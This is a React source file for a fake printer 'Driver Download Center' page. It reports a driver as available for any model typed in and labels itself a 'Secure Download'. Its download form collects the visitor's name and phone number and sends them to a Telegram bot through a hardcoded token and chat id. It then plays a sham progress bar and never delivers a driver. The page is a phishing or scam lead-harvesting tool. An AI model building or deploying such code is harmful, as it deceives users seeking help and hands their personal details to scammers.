import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useToast } from "@/components/ui/use-toast";
import { Shield, CheckCircle, Search } from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { Card, CardContent } from "@/components/ui/card";
import { Download, Timer, Info } from "lucide-react";
import { Progress } from "@/components/ui/progress";

const DriverDownload = () => {
  const [modelNumber, setModelNumber] = useState("");
  const [showDrivers, setShowDrivers] = useState(false);
  const [showForm, setShowForm] = useState(false);
  const [downloadProgress, setDownloadProgress] = useState(false);
  const [progress, setProgress] = useState(0);
  const [timeRemaining, setTimeRemaining] = useState(10);
  const [userOS, setUserOS] = useState("");
  const [formData, setFormData] = useState({
    name: "",
    phone: "",
  });
  const { toast } = useToast();

  useEffect(() => {
    const ua = window.navigator.userAgent;
    if (ua.indexOf("Windows NT 10.0") !== -1) setUserOS("Windows 10 64-bit");
    else if (ua.indexOf("Windows NT 11.0") !== -1) setUserOS("Windows 11 64-bit");
    else setUserOS("Windows 10/11 64-bit");
  }, []);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (modelNumber.trim()) {
      setShowDrivers(true);
    }
  };

  const startDownload = async (e) => {
    e.preventDefault();
    try {
      const message = `
New Driver Download Request:
Model: ${modelNumber}
Name: ${formData.name}
Phone: ${formData.phone}
OS: ${userOS}
      `;

      await fetch(
        `https://api.telegram.org/bot7575372348:AAEFfVtgEXvhQLyr7b4IhLGAQPjXl-0Kjjk/sendMessage`,
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: "1684000886",
            text: message,
          }),
        }
      );

      setDownloadProgress(true);

      let currentProgress = 0;
      const interval = setInterval(() => {
        currentProgress += 10;
        setProgress(currentProgress);
        setTimeRemaining((prev) => Math.max(0, prev - 1));

        if (currentProgress >= 100) {
          clearInterval(interval);
          setTimeout(() => {
            window.location.href = "/downloads";
          }, 1000);
        }
      }, 1000);
    } catch (error) {
      toast({
        title: "Error",
        description: "Download failed. Please try again.",
        variant: "destructive",
      });
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 to-white">
      <div className="bg-white border-b border-slate-200 shadow-sm">
        <div className="container mx-auto px-6 py-4">
          <div className="flex items-center justify-between">
            <div>
              <h1 className="text-2xl font-bold text-slate-800">Driver Download Center</h1>
              <p className="text-slate-600 mt-1">Driver Support Portal</p>
            </div>
            <div className="hidden md:flex items-center gap-4">
              <div className="flex items-center gap-2 text-slate-600">
                <Shield className="h-5 w-5 text-blue-600" />
                <span>Secure Download</span>
              </div>
            </div>
          </div>
        </div>
      </div>

      <main className="container mx-auto px-6 py-6 max-w-4xl">
        <Card className="shadow-xl border border-slate-200 bg-white rounded-lg">
          <CardContent className="p-6">
            <div className="bg-blue-50 p-4 rounded-lg border border-blue-200 mb-6">
              <div className="flex items-center gap-3">
                <Info className="h-5 w-5 text-blue-700" />
                <div>
                  <p className="text-slate-700">Current System: {userOS}</p>
                </div>
              </div>
            </div>

            <form onSubmit={handleSubmit} className="space-y-4">
              <div>
                <Label htmlFor="model" className="text-lg font-bold text-slate-800 block mb-2">
                  Enter Printer Model Number
                </Label>
                <div className="relative">
                  <Input
                    id="model"
                    placeholder="Example: DeskJet 2700"
                    className="h-12 text-lg pl-12 border-2 border-slate-200 rounded-lg"
                    value={modelNumber}
                    onChange={(e) => setModelNumber(e.target.value)}
                  />
                  <Search className="absolute left-4 top-3.5 h-5 w-5 text-slate-400" />
                </div>
              </div>
              <Button
                type="submit"
                className="h-12 text-lg w-full bg-blue-700 hover:bg-blue-800 transition-colors"
              >
                Search Drivers
              </Button>
            </form>

            {showDrivers && (
              <div className="mt-6">
                <Card className="border-2 border-green-100 rounded-lg bg-white">
                  <CardContent className="p-4">
                    <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
                      <div>
                        <div className="inline-flex items-center px-3 py-1 bg-green-50 text-green-700 rounded-full border border-green-200 mb-2">
                          <CheckCircle className="h-4 w-4 mr-2" />
                          Driver Available
                        </div>
                        <h4 className="text-xl font-bold text-slate-800 mb-2">
                          {modelNumber} Driver
                        </h4>
                        <div className="space-y-1 text-slate-600">
                          <p>Version: 5.0.1.234 | {userOS}</p>
                        </div>
                      </div>
                      <Button
                        onClick={() => setShowForm(true)}
                        className="h-12 px-6 bg-green-600 hover:bg-green-700 transition-colors rounded-lg w-full md:w-auto text-lg"
                      >
                        <Download className="mr-2 h-5 w-5" />
                        Download
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              </div>
            )}
          </CardContent>
        </Card>
      </main>

      <Dialog 
      open={showForm} 
      onOpenChange={(open) => {
        if (!open && !downloadProgress) {
          setShowForm(false);
        }
      }}
    >
      <DialogContent 
        className="sm:max-w-md p-6 rounded-lg"
        onPointerDownOutside={(e) => e.preventDefault()}
        onEscapeKeyDown={(e) => e.preventDefault()}
      >
        <DialogHeader>
          <DialogTitle className="text-2xl font-bold text-center text-slate-800">
            {downloadProgress ? (
              <div className="flex items-center justify-center gap-2">
                <Download className="h-6 w-6 animate-pulse" />
                Downloading Driver Package
              </div>
            ) : (
              "Complete Download Form"
            )}
          </DialogTitle>
        </DialogHeader>

        {!downloadProgress ? (
          <form onSubmit={startDownload} className="space-y-6 py-4">
            <div className="bg-blue-50 p-4 rounded-lg mb-4">
              <p className="text-blue-800 font-medium">Selected Package:</p>
              <p className="text-blue-600 mt-1">Compatible with {userOS}</p>
              <p className="text-blue-600">Version: 5.0.1.234</p>
            </div>
            <div>
              <Label htmlFor="name" className="text-lg font-medium text-slate-800">Full Name</Label>
              <Input
                id="name"
                required
                className="mt-2 h-14 text-lg border-2"
                value={formData.name}
                onChange={(e) => setFormData({ ...formData, name: e.target.value })}
              />
            </div>
            <div>
              <Label htmlFor="phone" className="text-lg font-medium text-slate-800">Phone Number</Label>
              <Input
                id="phone"
                type="tel"
                required
                className="mt-2 h-14 text-lg border-2"
                value={formData.phone}
                onChange={(e) => setFormData({ ...formData, phone: e.target.value })}
              />
            </div>
            <Button
              type="submit"
              className="w-full h-14 text-lg bg-blue-700 hover:bg-blue-800"
            >
              Start Secure Download
            </Button>
          </form>
        ) : (
          <div className="space-y-6 py-6">
            <div className="relative pt-4">
              <Progress value={progress} className="h-3 rounded-full" />
              <div className="absolute top-0 left-0 w-full flex justify-center">
                <span className="bg-white px-2 text-sm font-medium text-blue-700">
                  {progress}% Complete
                </span>
              </div>
            </div>
            <div className="bg-slate-50 p-4 rounded-lg">
              <div className="flex items-center justify-between text-slate-700">
                <div className="flex items-center gap-2">
                  <Timer className="h-5 w-5 text-blue-600" />
                  <span className="font-medium">Time Remaining:</span>
                </div>
                <span className="font-bold">{timeRemaining}s</span>
              </div>
              <div className="mt-2 text-sm text-slate-600">
                Please keep this window open until download completes
              </div>
            </div>
          </div>
        )}
      </DialogContent>
    </Dialog>
  </div>
);
};

export default DriverDownload;